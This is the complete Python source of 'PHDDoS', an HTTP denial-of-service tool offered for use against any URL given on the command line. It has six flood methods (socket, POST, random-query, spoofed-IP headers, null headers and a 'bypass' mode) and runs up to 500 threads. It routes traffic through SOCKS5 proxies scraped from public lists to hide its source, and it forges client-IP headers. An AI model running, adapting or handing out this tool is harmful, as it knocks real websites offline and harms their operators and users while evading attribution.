

"""
	PHDDoS
	Code With <3 By MsYor
	creds: FDc0d3, MrRage, Sussy

	idk i made weird shit again :|
	if you mod/edit, give me credit :)

	Contact me? TG: @Ms_Yor

"""

from ssl import CERT_NONE, SSLContext, create_default_context
from logging import basicConfig, getLogger, info, warning
from urllib.parse import urlparse
from os import system
from sys import stdout, argv
from threading import Thread
import re, os, sys, time, datetime, socket, random
try:
	from requests.structures import CaseInsensitiveDict
	from requests import get
	import certifi
	import socks
	import psutil
except Exception as err:
	exit(f"[!] {err}")


class COLOR:
	ATTACKING = '\033[95m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	GREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	RESET = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
#basicConfig(format='[%(levelname)s] %(message)s')
getLogger().setLevel("INFO")



char = lambda strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890": str(random.choice(strings)+str(random.randint(0, 271400281257))+random.choice(strings)+str(random.randint(0, 271004281257))+random.choice(strings)+random.choice(strings)+str(random.randint(0, 271400281257))+random.choice(strings)+str(random.randint(0, 271004281257))+random.choice(strings))

example = [
	'http://website.com',
	'https://website.com',
	'https://www.website.com'
]
method = [
	'bypass',
	'spoof',
	'post',
	'flood',
	'null',
	'rand'
]
httpmethod = [
	'GET',
	'HEAD'
]
query = [
	f'?{char()}'
	'?%RAND%',
	'?%RANDOM%'
	'?s=%RAND%',
	f'?true={char()}',
	f'?q={char()}',
	f'//?{char()}',
	f'/?{char()}',
	f'?{char()}'
]
refers = [
	'https://www.google.com',
	'https://www.pornhub.com',
	'https://www.facebook.com',
	'https://www.tiktok.com',
	'https://www.youtube.com',
	'https://www.amazon.com',
	'https://www.roblox.com'

]
accepts = [                                                                                              "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
    "Accept: text/html, application/xhtml+xml\r\nAccept-Encoding: gzip, deflate",
]
lang_header = [
	'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
	'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
	'en-US,en;q=0.5',
	'en-US,en;q=0.9',
	'de-CH;q=0.7',
	'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
	'da, en-gb;q=0.8, en;q=0.7',
	'cs;q=0.5'
]
encoding_header = [
	'deflate, gzip;q=1.0, *;q=0.5',
	'gzip, deflate, br',
	'*'
]
control_header = [
	'no-cache',
	'no-store',
	'no-transform',
	'only-if-cached',
	'max-age=0'
]



if len(sys.argv[1:]) != 4:
	print(f"""{COLOR.ATTACKING}
	{COLOR.BLUE}PH{COLOR.FAIL}DDoS {COLOR.RESET}{COLOR.CYAN}Developed by {COLOR.BOLD}{COLOR.UNDERLINE}MsYor{COLOR.RESET}
{COLOR.WARNING}
Available Method:{COLOR.ATTACKING}{COLOR.RESET}
    {COLOR.ATTACKING}flood: {COLOR.RESET}{COLOR.UNDERLINE}Socket Flood{COLOR.RESET}
    {COLOR.ATTACKING}post: {COLOR.RESET}{COLOR.UNDERLINE}Http POST Flood{COLOR.RESET}
    {COLOR.ATTACKING}rand: {COLOR.RESET}{COLOR.UNDERLINE}Http GET with Random query{COLOR.RESET}
    {COLOR.ATTACKING}spoof: {COLOR.RESET}{COLOR.UNDERLINE}Http GET Flood with Spoofed IP{COLOR.RESET}
    {COLOR.ATTACKING}null: {COLOR.RESET}{COLOR.UNDERLINE}Http GET Invalid Headers{COLOR.RESET}
    {COLOR.ATTACKING}bypass: {COLOR.RESET}{COLOR.UNDERLINE}Bypass small Protections{COLOR.RESET}
""")
	print(f"{COLOR.WARNING}Usage:\n  {COLOR.ATTACKING}python3 {argv[0]} [Method] [{random.choice(example)}] [Thread] [Time]{COLOR.RESET}")
	exit(f"{COLOR.WARNING}Example:\n  {COLOR.ATTACKING}python3 {argv[0]} {random.choice(method)} {random.choice(example)} {random.randint(100, 500)} {random.randint(1000, 10000)}\n{COLOR.RESET}")




class PHDDoS:

	@staticmethod
	def randip():
		fake_ip = []
		ip = []
		ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
		ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)
		all = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
		fake_ip.append(all)
		return fake_ip


	@staticmethod
	def checkCPU():
		return f"{psutil.cpu_percent():.2f}%"


	@staticmethod
	def logging(timer):
		timeout = timer
		while timer > 0:
			if method in ['rand', 'RAND']:
				path = PHDDoS.urlfixer(target)['path'] + random.choice(query)
			else:
				path = PHDDoS.urlfixer(target)['path']
			minutes, seconds = divmod(timer, 60)
			hours, minutes = divmod(minutes, 60)
			timeleft = str(hours).zfill(2)+":"+str(minutes).zfill(2)+":"+str(seconds).zfill(2)
			info(f"""{COLOR.GREEN}ATTACKING: {COLOR.WARNING}CPU: {COLOR.ATTACKING}{PHDDoS.checkCPU()}{COLOR.WARNING}
       METHOD: {COLOR.ATTACKING}{method.upper()} {COLOR.WARNING}
       HOST: {COLOR.ATTACKING}{PHDDoS.urlfixer(target)['host']} {COLOR.WARNING}
       PORT: {COLOR.ATTACKING}{PHDDoS.urlfixer(target)['port']} {COLOR.WARNING}
       PATH: {COLOR.ATTACKING}{path}{COLOR.WARNING}
       THREAD: {COLOR.ATTACKING}{thread}{COLOR.WARNING}
       EXPIRE: {COLOR.ATTACKING}{timeleft}{COLOR.RESET}\n""")
			time.sleep(1)
			timer = timer -1
			if timer == timeout:
				return
		info(f"{COLOR.WARNING}ATTACK DONE!{COLOR.RESET}")
		warning(f"{COLOR.WARNING}EXITING...{COLOR.RESET}")
		info(f"{COLOR.WARNING}KILLING THREAD...{COLOR.RESET}")
		system('pkill -f PHDDoS.py')

	@staticmethod
	def urlfixer(url):
		parsed = CaseInsensitiveDict()
		parsed['path'] = urlparse(url).path
		if parsed['path'] == "":
			parsed['path'] = "/"
		parsed['host'] = urlparse(url).netloc
		parsed['scheme'] = urlparse(url).scheme
		if ":" in urlparse(url).netloc:
			parsed['port'] = urlparse(url).netloc.split(":")[1]
		else:
			parsed['port'] = "443" if urlparse(url).scheme == "https" else "80"

		return parsed


	@staticmethod
	def getUA():
		return random.choice([line.strip() for line in get("https://raw.githubusercontent.com/FDc0d3/GoodUA/main/MrRageUA.txt").text.split('\n')])

	@staticmethod
	def getproxies():
		info(f"{COLOR.WARNING}Dowloading Socks5 Proxies...{COLOR.RESET}")
		socks5_proxies = [
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite",
		"https://www.proxy-list.download/api/v1/get?type=socks5&anon=anonymous"]
		file_name = "socks5.txt"
		with open(file_name, 'w'):
			for proxies in socks5_proxies:
				if get(proxies).status_code == 200:
					with open(file_name, 'a') as p:
						p.write(get(proxies).text)
			with open(file_name, 'r') as count:
				info(f"{COLOR.WARNING}Total Socks5 Proxy:{COLOR.ATTACKING} {len(count.readlines())}{COLOR.RESET}")
				info(f"{COLOR.WARNING}Ilulunsad ang Pag-atake sa loob ng 5 segundo...{COLOR.RESET}")
				time.sleep(5)

	@staticmethod
	def read_socks5proxies():
		return [line.strip() for line in open(file="socks5.txt", mode="r").readlines()]


	@staticmethod
	def flood():
		payload = "GET " + PHDDoS.urlfixer(target)['path'] + " HTTP/1.1\r\n"
		payload += "Host: " + PHDDoS.urlfixer(target)['host'] + "\r\n"
		payload += "Connection: Keep-Alive\r\n"
		payload += "Referer: " + random.choice(refers) + "\r\n"
		payload += random.choice(accepts) + "\r\n"
		payload += "User-Agent: " + PHDDoS.getUA() + "\r\n"
		payload += "Upgrade-Insecure-Requests: 1\r\n\r\n"
		proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
		while 1:
			sockInit = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
			sockInit.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			sockInit.settimeout(3)
			try:
				sockInit.connect((str(PHDDoS.urlfixer(target)['host']), int(PHDDoS.urlfixer(target)['port'])))
				if PHDDoS.urlfixer(target)['scheme'] == "https":
					ctx = create_default_context()
					ctx.check_hostname = False
					ctx.verify_mode = CERT_NONE
					sockInit = ctx.wrap_socket(sockInit, server_hostname=PHDDoS.urlfixer(target)['host'])
			except:
				sockInit.close()
				proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
				continue
			for _ in range(10, 200):
				try:
					sockInit.send(str.encode(payload))
					writer = sockInit.makefile(mode="wb")
					writer.write(str(payload).encode())
					writer.flush()
				except:
					break
				sockInit.close()


	@staticmethod
	def post():
		payload = "POST " + PHDDoS.urlfixer(target)['path'] + " HTTP/1.1\r\n"
		payload += "Host: " + PHDDoS.urlfixer(target)['host'] + "\r\n"
		payload += "Connection: Keep-Alive\r\n"
		payload += "Content-Type: text/plain\r\n"
		payload += random.choice(accepts) + "\r\n"
		payload += "User-Agent: " + PHDDoS.getUA() + "\r\n"
		payload += "Upgrade-Insecure-Requests: 1\r\n\r\n"
		proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
		while 1:
			sockInit = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
			sockInit.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			sockInit.settimeout(3)
			try:
				sockInit.connect((str(PHDDoS.urlfixer(target)['host']), int(PHDDoS.urlfixer(target)['port'])))
				if PHDDoS.urlfixer(target)['scheme'] == "https":
					ctx = create_default_context()
					ctx.check_hostname = False
					ctx.verify_mode = CERT_NONE
					sockInit = ctx.wrap_socket(sockInit, server_hostname=PHDDoS.urlfixer(target)['host'])
			except:
				sockInit.close()
				proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
				continue
			for _ in range(10, 200):
				try:
					sockInit.send(str.encode(payload))
					writer = sockInit.makefile(mode="wb")
					writer.write(str(payload).encode())
					writer.flush()
				except:
					break
				sockInit.close()

	@staticmethod
	def rand():
		payload = "GET " + PHDDoS.urlfixer(target)['path'] + random.choice(query) + " HTTP/1.1\r\n"
		payload += "Host: " + PHDDoS.urlfixer(target)['host'] + "\r\n"
		payload += "Connection: Keep-Alive\r\n"
		payload += "Referer: " + random.choice(refers) + "\r\n"
		payload += random.choice(accepts) + "\r\n"
		payload += "User-Agent: " + PHDDoS.getUA() + "\r\n"
		payload += "Upgrade-Insecure-Requests: 1\r\n\r\n"
		proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
		while 1:
			sockInit = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
			sockInit.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			sockInit.settimeout(3)
			try:
				sockInit.connect((str(PHDDoS.urlfixer(target)['host']), int(PHDDoS.urlfixer(target)['port'])))
				if PHDDoS.urlfixer(target)['scheme'] == "https":
					ctx = create_default_context()
					ctx.check_hostname = False
					ctx.verify_mode = CERT_NONE
					sockInit = ctx.wrap_socket(sockInit, server_hostname=PHDDoS.urlfixer(target)['host'])
			except:
				sockInit.close()
				proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
				continue
			for _ in range(10, 200):
				try:
					sockInit.send(str.encode(payload))
					writer = sockInit.makefile(mode="wb")
					writer.write(str(payload).encode())
					writer.flush()
				except:
					break
				sockInit.close()


	@staticmethod
	def spoof():
		payload = "GET " + PHDDoS.urlfixer(target)['path'] + " HTTP/1.1\r\n"
		payload += "Host: " + PHDDoS.urlfixer(target)['host'] + "\r\n"
		payload += "Connection: Keep-Alive\r\n"
		payload += "Referer: " + random.choice(refers) + "\r\n"
		payload += random.choice(accepts) + "\r\n"
		payload += "User-Agent: " + PHDDoS.getUA() + "\r\n"
		payload += "X-Forwarded-Proto: Http\r\n"
		payload += f"X-Forwarded-Host: {PHDDoS.urlfixer(target)['host']}, 1.1.1.1\r\n"
		payload += f"Via: {random.choice(PHDDoS.randip())}\r\n"
		payload += f"Client-IP: {random.choice(PHDDoS.randip())}\r\n"
		payload += f"X-Forwarded-For: {random.choice(PHDDoS.randip())}\r\n"
		payload += f"Real-IP: {random.choice(PHDDoS.randip())}\r\n"
		payload += "Upgrade-Insecure-Requests: 1\r\n\r\n"
		proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
		while 1:
			sockInit = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
			sockInit.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			sockInit.settimeout(3)
			try:
				sockInit.connect((str(PHDDoS.urlfixer(target)['host']), int(PHDDoS.urlfixer(target)['port'])))
				if PHDDoS.urlfixer(target)['scheme'] == "https":
					ctx = create_default_context()
					ctx.check_hostname = False
					ctx.verify_mode = CERT_NONE
					sockInit = ctx.wrap_socket(sockInit, server_hostname=PHDDoS.urlfixer(target)['host'])
			except:
				sockInit.close()
				proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
				continue
			for _ in range(10, 200):
				try:
					sockInit.send(str.encode(payload))
					writer = sockInit.makefile(mode="wb")
					writer.write(str(payload).encode())
					writer.flush()
				except:
					break
				sockInit.close()



	@staticmethod
	def null():
		payload = "GET " + PHDDoS.urlfixer(target)['path'] + " HTTP/1.1\r\n"
		payload += "Host: " + PHDDoS.urlfixer(target)['host'] + "\r\n"
		payload += "Connection: close\r\n"
		payload += "Referer: null\r\n"
		payload += "Accept-Language: null\r\n"
		payload += "Accept-Encoding: null\r\n"
		payload += "Accept-Language: null\r\n"
		payload += "Accept-Encoding: null\r\n"
		payload += "Accept: null\r\n"
		payload += "User-Agent: null\r\n"
		payload += "X-Forwarded-Proto: Http\r\n"
		payload += "X-Forwarded-Host: null, null\r\n"
		payload += "Via: null\r\n"
		payload += "Client-IP: null\r\n"
		payload += "X-Forwarded-For: null\r\n"
		payload += "Real-IP: null\r\n"
		payload += "Upgrade-Insecure-Requests: 1\r\n\r\n"
		proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
		while 1:
			sockInit = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
			sockInit.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			sockInit.settimeout(3)
			try:
				sockInit.connect((str(PHDDoS.urlfixer(target)['host']), int(PHDDoS.urlfixer(target)['port'])))
				if PHDDoS.urlfixer(target)['scheme'] == "https":
					ctx = create_default_context()
					ctx.check_hostname = False
					ctx.verify_mode = CERT_NONE
					sockInit = ctx.wrap_socket(sockInit, server_hostname=PHDDoS.urlfixer(target)['host'])
			except:
				sockInit.close()
				proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
				continue
			for _ in range(10, 200):
				try:
					sockInit.send(str.encode(payload))
					writer = sockInit.makefile(mode="wb")
					writer.write(str(payload).encode())
					writer.flush()
				except:
					break
				sockInit.close()

	@staticmethod
	def bypass():
		payload = f"{random.choice(httpmethod)} " + PHDDoS.urlfixer(target)['path'] + " HTTP/1.1\r\n"
		payload += "Host: " + PHDDoS.urlfixer(target)['host'] + "\r\n"
		payload += "Connection: Keep-Alive\r\n"
		payload += "Cache-Control: " + random.choice(control_header) + "\r\n"
		payload += "Pragma: " + random.choice(control_header) + "\r\n"
		payload += "Referer: " + random.choice(refers) + "\r\n"
		payload += random.choice(accepts) + "\r\n"
		payload += "User-Agent: " + PHDDoS.getUA() + "\r\n"
		payload += "X-Forwarded-For: " + random.choice(PHDDoS.randip()) + "\r\n"
		payload += "X-Forwarded-Host: " + random.choice(PHDDoS.randip()) + "\r\n"
		payload += "Upgrade-Insecure-Requests: 1\r\n\r\n"
		proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
		while 1:
			sockInit = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
			sockInit.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			sockInit.settimeout(3)
			try:
				sockInit.connect((str(PHDDoS.urlfixer(target)['host']), int(PHDDoS.urlfixer(target)['port'])))
				if PHDDoS.urlfixer(target)['scheme'] == "https":
					ctx = SSLContext = create_default_context(cafile=certifi.where())
					ctx.check_hostname = False
					ctx.verify_mode = CERT_NONE
					sockInit = ctx.wrap_socket(sockInit, server_hostname=PHDDoS.urlfixer(target)['host'])
			except:
				sockInit.close()
				proxy = random.choice(PHDDoS.read_socks5proxies()).split(":")
				continue
			for _ in range(10, 200):
				try:
					sockInit.send(str.encode(payload))
					writer = sockInit.makefile(mode="wb")
					writer.write(str(payload).encode())
					writer.flush()
				except:
					break
				sockInit.close()



if __name__ == "__main__":
	target = str(argv[2])
	floodtime = int(argv[4])
	method = str(argv[1])
	thread = int(argv[3])

	if thread > 500 or thread < 1:
		warning(f"{COLOR.WARNING}MAX THREAD: {COLOR.ATTACKING}500{COLOR.RESET}")
		exit()

	if method in ["flood", "FLOOD"]:
		PHDDoS.getproxies()
		Thread(target=PHDDoS.logging, args=(floodtime,)).start()
		for _ in range(thread):
			Thread(target=PHDDoS.flood).start()

	elif method in ["post", "POST"]:
		PHDDoS.getproxies()
		Thread(target=PHDDoS.logging, args=(floodtime,)).start()
		for _ in range(thread):
			Thread(target=PHDDoS.post).start()

	elif method in ["rand", "RAND"]:
		PHDDoS.getproxies()
		Thread(target=PHDDoS.logging, args=(floodtime,)).start()
		for _ in range(thread):
			Thread(target=PHDDoS.rand).start()

	elif method in ["spoof", "SPOOF"]:
		PHDDoS.getproxies()
		Thread(target=PHDDoS.logging, args=(floodtime,)).start()
		for _ in range(thread):
			Thread(target=PHDDoS.spoof).start()

	elif method in ["null", "NULL"]:
		PHDDoS.getproxies()
		Thread(target=PHDDoS.logging, args=(floodtime,)).start()
		for _ in range(thread):
			Thread(target=PHDDoS.null).start()

	elif method in ["bypass", "BYPASS"]:
		PHDDoS.getproxies()
		Thread(target=PHDDoS.logging, args=(floodtime,)).start()
		for _ in range(thread):
			Thread(target=PHDDoS.bypass).start()
	else:
		warning(f"{COLOR.WARNING}INVALID METHOD{COLOR.RESET}")
		exit()
